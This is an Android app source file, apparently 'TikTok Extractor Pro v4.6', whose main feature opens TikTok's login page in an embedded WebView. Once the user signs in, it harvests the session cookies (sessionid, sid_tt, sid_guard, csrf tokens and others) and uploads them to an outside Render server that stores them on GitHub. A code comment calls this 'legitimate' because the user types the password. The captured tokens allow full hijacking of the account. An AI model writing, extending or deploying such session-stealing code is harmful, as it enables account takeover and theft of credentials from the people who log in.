package com.tiktok.extractor;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import com.google.android.material.floatingactionbutton.FloatingActionButton;
import org.json.JSONObject;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

/**
 * MainActivity — TikTok Extractor Pro v4.6
 *
 * 3 Floating Action Buttons:
 *   - fabDatabase (cyan): Monitor users/sessions database
 *   - fabLogin (orange): TikTok login capture — opens WebView, captures ALL cookies after manual login
 *   - fabInteract (pink): Quick extract current URL
 *
 * v4.6 KEY FEATURE: Login Event Capture
 *   When user taps fabLogin:
 *     1. Opens a full-screen WebView to tiktok.com/login
 *     2. User enters email/password MANUALLY (no automation)
 *     3. After successful login, captures ALL cookies: sessionid, ttwid, msToken, sid_tt, etc.
 *     4. Uploads them to GitHub via /api/session endpoint
 *     5. Returns to main PWA view
 *
 * This is legitimate: user performs the login themselves, we just capture the resulting cookies.
 */
public class MainActivity extends AppCompatActivity {
    private static final String TAG = "TikTokExtractor";
    private static final String PWA_URL = "https://tiktok-extractor-pro.onrender.com/";
    private static final String TIKTOK_LOGIN_URL = "https://www.tiktok.com/login/phone-or-email/email";
    private static final String TIKTOK_HOME_URL = "https://www.tiktok.com/";
    private static final String PREFS_NAME = "tiktok_session_prefs";

    private WebView webView;
    private WebView loginWebView;  // Separate WebView for login capture
    private ProgressBar progressBar;
    private TextView errorView;
    private FloatingActionButton fabDatabase, fabLogin, fabInteract;
    private SharedPreferences prefs;

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.i(TAG, "MainActivity.onCreate() v4.6 starting");
        prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);

        try {
            setContentView(R.layout.activity_main);
            progressBar = findViewById(R.id.progressBar);
            errorView = findViewById(R.id.errorView);
            webView = findViewById(R.id.webview);
            fabDatabase = findViewById(R.id.fabDatabase);
            fabLogin = findViewById(R.id.fabLogin);
            fabInteract = findViewById(R.id.fabInteract);

            if (webView == null) {
                showError("خطأ داخلي: WebView غير متوفر.\nأعد تثبيت التطبيق.");
                return;
            }

            setupMainWebView();
            setupFABs();

            if (savedInstanceState != null) {
                webView.restoreState(savedInstanceState);
            } else {
                webView.loadUrl(PWA_URL);
            }

            // إخفاء أزرار FAB حتى تُحمّل الصفحة
            hideAllFABs();

        } catch (Exception e) {
            Log.e(TAG, "onCreate() crashed", e);
            showError("خطأ في بدء التطبيق:\n" + e.getMessage());
        }
    }

    /**
     * يُعدّد WebView الرئيسي (لوحة التحكم PWA)
     */
    @SuppressLint("SetJavaScriptEnabled")
    private void setupMainWebView() {
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        settings.setCacheMode(WebSettings.LOAD_DEFAULT);
        settings.setLoadWithOverviewMode(true);
        settings.setUseWideViewPort(true);
        settings.setSupportZoom(false);
        settings.setBuiltInZoomControls(false);
        settings.setMediaPlaybackRequiresUserGesture(false);
        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_NEVER_ALLOW);
        settings.setUserAgentString(
            "Mozilla/5.0 (Linux; Android 14; TikTokExtractorPro) " +
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36"
        );

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageStarted(WebView view, String url, android.graphics.Bitmap favicon) {
                if (progressBar != null) {
                    progressBar.setVisibility(View.VISIBLE);
                    progressBar.setProgress(0);
                }
                if (errorView != null) errorView.setVisibility(View.GONE);
                if (webView != null) webView.setVisibility(View.VISIBLE);
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                if (progressBar != null) progressBar.setVisibility(View.GONE);
                showAllFABs();
            }

            @Override
            public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
                if (request != null && request.isForMainFrame()) {
                    String desc = error != null && error.getDescription() != null
                            ? error.getDescription().toString() : "خطأ غير معروف";
                    showError("تعذّر تحميل الصفحة:\n" + desc);
                }
            }
        });

        webView.setWebChromeClient(new android.webkit.WebChromeClient() {
            @Override
            public void onProgressChanged(WebView view, int newProgress) {
                if (progressBar != null) {
                    progressBar.setProgress(newProgress);
                    if (newProgress >= 100) progressBar.setVisibility(View.GONE);
                }
            }
            @Override
            public boolean onConsoleMessage(android.webkit.ConsoleMessage cm) {
                Log.d(TAG, "JS[" + cm.messageLevel() + "]: " + cm.message());
                return true;
            }
        });
    }

    /**
     * يُعدّد أزرار FAB الثلاثة
     */
    private void setupFABs() {
        // ─── زر قاعدة البيانات ───
        if (fabDatabase != null) {
            fabDatabase.setOnClickListener(v -> {
                hideAllFABs();
                runJs("(() => { const t = document.querySelector('.nav-tab[data-tab=\"database\"]'); if (t) t.click(); })();");
                toast("📊 فتح قاعدة البيانات");
                v.postDelayed(this::showAllFABs, 800);
            });
            fabDatabase.setOnLongClickListener(v -> {
                runJs("(() => { const b = document.getElementById('dbRefreshBtn'); if (b) b.click(); })();");
                toast("🔄 تحديث القائمة");
                return true;
            });
        }

        // ─── زر تسجيل الدخول (التقاط الأحداث) ───
        if (fabLogin != null) {
            fabLogin.setOnClickListener(v -> {
                Log.i(TAG, "FAB Login clicked — opening TikTok login WebView");
                openLoginCaptureWebView();
            });
            fabLogin.setOnLongClickListener(v -> {
                // ضغطة طويلة: فحص الجلسة المحفوظة سابقاً
                checkSavedSession();
                return true;
            });
        }

        // ─── زر التفاعل التلقائي ───
        if (fabInteract != null) {
            fabInteract.setOnClickListener(v -> {
                runJs("(() => { const i = document.getElementById('urlInput'); if (i && i.value) { const b = document.getElementById('extractBtn'); if (b) b.click(); } else { alert('الصق رابط TikTok أولاً'); } })();");
                toast("⚡ استخراج");
            });
            fabInteract.setOnLongClickListener(v -> {
                runJs("(() => { const t = document.querySelector('.nav-tab[data-tab=\"database\"]'); if (t) t.click(); setTimeout(() => { const b = document.getElementById('dbSyncBtn'); if (b) b.click(); }, 500); })();");
                toast("🔄 مزامنة GitHub");
                return true;
            });
        }
    }

    // ════════════════════════════════════════════════════════════════
    //  v4.6: Login Event Capture — يفتح WebView لتسجيل دخول يدوي
    //         ويلتقط كل الكوكيز تلقائياً بعد النجاح
    // ════════════════════════════════════════════════════════════════

    /**
     * يفتح WebView مستقل لتسجيل الدخول إلى TikTok.
     * المستخدم يُدخل بريده/كلمة مروره بنفسه (لا أتمتة).
     * بعد النجاح، يلتقط النظام كل الكوكيز ويُرسلها إلى /api/session.
     */
    @SuppressLint("SetJavaScriptEnabled")
    private void openLoginCaptureWebView() {
        toast("🔐 افتح TikTok وسجّل دخولك بنفسك");

        // إنشاء WebView مستقل بشكل برمجي
        loginWebView = new WebView(this);
        WebSettings settings = loginWebView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        settings.setUserAgentString(
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 " +
            "(KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36"
        );

        // تفعيل cookies (مهم جداً)
        CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        cookieManager.setAcceptThirdPartyCookies(loginWebView, true);

        // إخفاء الـ WebView الرئيسي وإظهار login WebView
        webView.setVisibility(View.GONE);
        hideAllFABs();
        // إضافة login WebView إلى الـ layout
        android.view.ViewGroup root = (android.view.ViewGroup) webView.getParent();
        root.addView(loginWebView, new android.widget.FrameLayout.LayoutParams(
            android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
            android.widget.FrameLayout.LayoutParams.MATCH_PARENT
        ));

        // مُراقب لالتقاط الكوكيز بعد كل تحميل صفحة
        loginWebView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                Log.i(TAG, "Login page loaded: " + url);

                // افحص الكوكيز بعد كل تنقل
                String cookies = cookieManager.getCookie("https://www.tiktok.com/");
                if (cookies != null && cookies.contains("sessionid")) {
                    Log.i(TAG, "✓ sessionid detected in cookies — capturing!");
                    captureAndUploadSession(cookies, url);
                }
            }

            @Override
            public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
                Log.e(TAG, "Login WebView error: " + (error != null ? error.getDescription() : "unknown"));
            }
        });

        // زر إغلاق (يظهر كـ overlay)
        TextView closeBtn = new TextView(this);
        closeBtn.setText("✕ إغلاق");
        closeBtn.setBackgroundColor(0xCC000000);
        closeBtn.setTextColor(0xFFFFFFFF);
        closeBtn.setPadding(24, 12, 24, 12);
        closeBtn.setTextSize(14);
        closeBtn.setOnClickListener(v -> closeLoginWebView());
        android.widget.FrameLayout.LayoutParams closeParams = new android.widget.FrameLayout.LayoutParams(
            android.widget.FrameLayout.LayoutParams.WRAP_CONTENT,
            android.widget.FrameLayout.LayoutParams.WRAP_CONTENT
        );
        closeParams.gravity = android.view.Gravity.TOP | android.view.Gravity.RIGHT;
        closeParams.topMargin = 40;
        closeParams.rightMargin = 20;
        ((android.view.ViewGroup) webView.getParent()).addView(closeBtn, closeParams);

        // تعليمات للمستخدم
        TextView hint = new TextView(this);
        hint.setText("📝 سجّل دخولك إلى TikTok أدناه.\nسيتم التقاط الجلسة تلقائياً عند النجاح.");
        hint.setBackgroundColor(0xCC000000);
        hint.setTextColor(0xFFFFFFFF);
        hint.setPadding(24, 16, 24, 16);
        hint.setTextSize(12);
        android.widget.FrameLayout.LayoutParams hintParams = new android.widget.FrameLayout.LayoutParams(
            android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
            android.widget.FrameLayout.LayoutParams.WRAP_CONTENT
        );
        hintParams.gravity = android.view.Gravity.BOTTOM;
        hintParams.bottomMargin = 20;
        ((android.view.ViewGroup) webView.getParent()).addView(hint, hintParams);

        // تحميل صفحة تسجيل الدخول
        loginWebView.loadUrl(TIKTOK_LOGIN_URL);
    }

    /**
     * يلتقط كل الكوكيز من CookieManager ويُرسلها إلى /api/session/capture على Render.
     * v4.6: لا يطلب unique_id — يلتقطه تلقائياً من TikTok عبر sessionid.
     */
    private void captureAndUploadSession(String cookieString, String currentUrl) {
        Log.i(TAG, "Capturing cookies, length=" + cookieString.length());

        // تحليل الكوكيز إلى خريطة
        Map<String, String> cookies = parseCookies(cookieString);
        String sessionid = cookies.get("sessionid");

        if (sessionid == null || sessionid.isEmpty()) {
            Log.w(TAG, "sessionid not found in cookies — skipping");
            return;
        }

        Log.i(TAG, "✓ Captured sessionid (length=" + sessionid.length() + ")");

        // بناء JSON payload — لا نرسل unique_id، النظام يلتقطه تلقائياً
        try {
            JSONObject extraCookies = new JSONObject();
            for (String key : new String[]{"ttwid", "msToken", "sid_tt", "passport_csrf_token",
                                            "passport_csrf_token_default", "sid_guard", "uid_tt",
                                            "uid_tt_ss", "tt_chain_token", "cmpl_token"}) {
                String val = cookies.get(key);
                if (val != null && !val.isEmpty()) {
                    extraCookies.put(key, val);
                }
            }

            JSONObject payload = new JSONObject();
            payload.put("sessionid", sessionid);
            payload.put("extra_cookies", extraCookies);

            Log.i(TAG, "Uploading session to /api/session/capture (auto-unique_id mode)");

            // إرسال إلى /api/session/capture عبر thread خلفي
            new Thread(() -> {
                try {
                    java.net.URL url = new java.net.URL(PWA_URL + "api/session/capture");
                    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(30000);
                    conn.setReadTimeout(60000);

                    byte[] body = payload.toString().getBytes("UTF-8");
                    java.io.OutputStream os = conn.getOutputStream();
                    os.write(body);
                    os.close();

                    int code = conn.getResponseCode();
                    String response = readResponse(conn);
                    Log.i(TAG, "Session capture response: " + code + " — " + response.substring(0, Math.min(400, response.length())));

                    // حلل الاستجابة
                    try {
                        JSONObject resp = new JSONObject(response);
                        final boolean success = resp.optBoolean("success", false);
                        final String uniqueId = resp.optString("unique_id", "(unknown)");
                        final String savedTo = resp.optString("saved_to", "github");
                        final String warning = resp.optString("warning", "");
                        final String errorMsg = resp.optString("error", "");

                        runOnUiThread(() -> {
                            if (success) {
                                String msg = "✅ تم التقاط الجلسة!\n" +
                                    "👤 المستخدم: @" + uniqueId + "\n" +
                                    "💾 الحفظ: " + ("github".equals(savedTo) ? "GitHub" : "محلي (GH_TOKEN غير مضبوط)");
                                if (!warning.isEmpty()) {
                                    msg += "\n⚠️ " + warning;
                                }
                                toast(msg);
                                // احفظ unique_id للاستخدام لاحقاً
                                prefs.edit().putString("last_unique_id", uniqueId).apply();
                                // أغلق WebView بعد نجاح الالتقاط
                                closeLoginWebView();
                            } else {
                                toast("❌ فشل الحفظ: " + errorMsg);
                            }
                        });
                    } catch (Exception e) {
                        Log.e(TAG, "Failed to parse response JSON", e);
                        runOnUiThread(() -> toast("⚠️ استجابة غير متوقعة: " + code));
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Session upload failed", e);
                    runOnUiThread(() -> toast("❌ خطأ شبكي: " + e.getMessage()));
                }
            }).start();

        } catch (Exception e) {
            Log.e(TAG, "Failed to build session payload", e);
        }
    }

    /**
     * يُحلّل سلسلة الكوكيز (key=value; key=value) إلى خريطة.
     */
    private Map<String, String> parseCookies(String cookieString) {
        Map<String, String> cookies = new HashMap<>();
        if (cookieString == null) return cookies;
        String[] parts = cookieString.split(";");
        for (String part : parts) {
            int eq = part.indexOf('=');
            if (eq > 0) {
                String key = part.substring(0, eq).trim();
                String value = part.substring(eq + 1).trim();
                cookies.put(key, value);
            }
        }
        return cookies;
    }

    /**
     * يقرأ استجابة HTTP كنص.
     */
    private String readResponse(java.net.HttpURLConnection conn) {
        try {
            java.io.InputStream is = conn.getResponseCode() >= 400
                    ? conn.getErrorStream() : conn.getInputStream();
            java.io.BufferedReader reader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(is, "UTF-8"));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
            return sb.toString();
        } catch (Exception e) {
            return "(error reading response: " + e.getMessage() + ")";
        }
    }

    /**
     * يُغلق WebView تسجيل الدخول ويعيد الواجهة الرئيسية.
     */
    private void closeLoginWebView() {
        if (loginWebView != null) {
            try {
                android.view.ViewGroup root = (android.view.ViewGroup) webView.getParent();
                root.removeView(loginWebView);
                loginWebView.destroy();
                loginWebView = null;
            } catch (Exception e) {
                Log.e(TAG, "closeLoginWebView failed", e);
            }
        }
        webView.setVisibility(View.VISIBLE);
        showAllFABs();
    }

    /**
     * يفحص ما إذا كانت هناك جلسة محفوظة للمستخدم.
     */
    private void checkSavedSession() {
        String uniqueId = prefs.getString("last_unique_id", "");
        if (uniqueId.isEmpty()) {
            toast("ℹ️ لا توجد جلسة محفوظة. استخدم زر تسجيل الدخول أولاً.");
            return;
        }
        toast("🔍 فحص الجلسة المحفوظة لـ " + uniqueId);
        runJs("(() => { fetch('/api/session/" + uniqueId + "/status').then(r=>r.json()).then(d=>{ alert(d.has_session ? '✅ جلسة محفوظة!\\nبتاريخ: ' + d.saved_at : 'ℹ️ لا توجد جلسة محفوظة'); }).catch(e=>alert('خطأ: '+e)); })();");
    }

    // ════════════════════════════════════════════════════════════════
    //  أدوات مساعدة عامة
    // ════════════════════════════════════════════════════════════════

    private void runJs(String js) {
        if (webView != null) {
            try {
                webView.post(() -> webView.evaluateJavascript(js, null));
            } catch (Exception e) {
                Log.e(TAG, "runJs failed", e);
            }
        }
    }

    private void toast(String message) {
        runOnUiThread(() -> {
            try {
                Toast.makeText(this, message, Toast.LENGTH_LONG).show();
            } catch (Exception e) {
                Log.e(TAG, "toast failed", e);
            }
        });
    }

    private void showError(String message) {
        runOnUiThread(() -> {
            try {
                if (webView != null) webView.setVisibility(View.GONE);
                if (progressBar != null) progressBar.setVisibility(View.GONE);
                if (errorView != null) {
                    errorView.setText(message);
                    errorView.setVisibility(View.VISIBLE);
                }
            } catch (Exception e) {
                Log.e(TAG, "showError() failed", e);
            }
        });
    }

    private void hideAllFABs() {
        if (fabDatabase != null) fabDatabase.hide();
        if (fabLogin != null) fabLogin.hide();
        if (fabInteract != null) fabInteract.hide();
    }

    private void showAllFABs() {
        if (fabDatabase != null) fabDatabase.show();
        if (fabLogin != null) fabLogin.show();
        if (fabInteract != null) fabInteract.show();
    }

    @Override
    public void onBackPressed() {
        if (loginWebView != null) {
            // إذا كان WebView تسجيل الدخول مفتوحاً، أغلقه بدلاً من الخروج
            closeLoginWebView();
            return;
        }
        try {
            if (webView != null && webView.canGoBack()) {
                webView.goBack();
            } else {
                super.onBackPressed();
            }
        } catch (Exception e) {
            super.onBackPressed();
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        try { if (webView != null) webView.onPause(); } catch (Exception e) {}
    }

    @Override
    protected void onResume() {
        super.onResume();
        try { if (webView != null) webView.onResume(); } catch (Exception e) {}
    }

    @Override
    protected void onDestroy() {
        try {
            if (loginWebView != null) {
                ((android.view.ViewGroup) loginWebView.getParent()).removeView(loginWebView);
                loginWebView.destroy();
                loginWebView = null;
            }
            if (webView != null) {
                ((android.view.ViewGroup) webView.getParent()).removeView(webView);
                webView.destroy();
                webView = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "onDestroy failed", e);
        }
        super.onDestroy();
    }

    @Override
    protected void onSaveInstanceState(Bundle outState) {
        super.onSaveInstanceState(outState);
        try { if (webView != null) webView.saveState(outState); } catch (Exception e) {}
    }
}
